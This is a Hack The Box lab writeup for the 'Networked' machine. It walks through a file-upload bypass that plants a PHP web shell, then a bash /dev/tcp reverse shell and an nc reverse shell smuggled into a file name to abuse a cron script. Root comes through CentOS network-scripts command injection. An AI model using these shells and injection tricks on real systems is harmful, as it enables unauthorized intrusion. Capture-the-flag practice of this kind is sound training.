---
title: "Networked - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Networked
![](https://kar0nx.github.io/assets/images/writeup/0b286019523dcd78cf03d3a3472a3792.png)
## Reconnaissance

IP: 10.10.10.146
## NMAP

```
nmap -T4 -p- -A 10.10.10.146
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 07:30 UTC
Nmap scan report for 10.10.10.146
Host is up (0.031s latency).
Not shown: 65401 filtered tcp ports (no-response), 131 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 3.10 (92%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 3.8 - 3.16 (90%), Linux 3.4 - 3.10 (90%), Linux 5.1 - 5.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   30.58 ms 10.10.14.1
2   30.92 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.00 seconds

```

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910093132.png)

Running feroxbuster

```
feroxbuster -u http://10.10.10.146/ -x .php
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910094628.png)

in /backup we have full site zip file

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910093222.png)

now we can access all source code 
now let's navigate to upload.php

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910100630.png)

Quick review of source code of upload.php and we can try bypass file upload, I use simple web shell .php as example

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910101324.png)

adding extra .gif change content-Type and add Magic bytes gif8 at the start 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910101225.png)

## Gaining Access

great now I have web shell, simple oneliner to get reverse shell

```
bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910101631.png)

can't read user.txt but there is another .php file here

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910104403.png)

Sooo, script execute every 3 min and there is no filtring options other than /, so maybe we can bypass it with only semicolon ; to end rm command and then take names of file as command.
I will try to add reverse shell to /var/www/html/uploads/ as filename 
Tried with base64 encoded bash oneliner but didn't work for me so I checked for nc and this works well

```
touch '; nc 10.10.14.8 4444 -c bash'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910110936.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910111002.png)

## Privilege Escalation

we can run custom script with sudo without password 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910111130.png)

Now I stucked, so watched ippsec video.
got a hint with this article 
https://seclists.org/fulldisclosure/2019/Apr/27?source=post_page-----d6a10ded7bc7---------------------------------------
Redhat/CentOS root through network-scripts
so after script ask for input and we type command after space it will execute, for example 
Script ask: what is your name:
we type: Karol whoami or Karol /bin/bash


![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250910111526.png)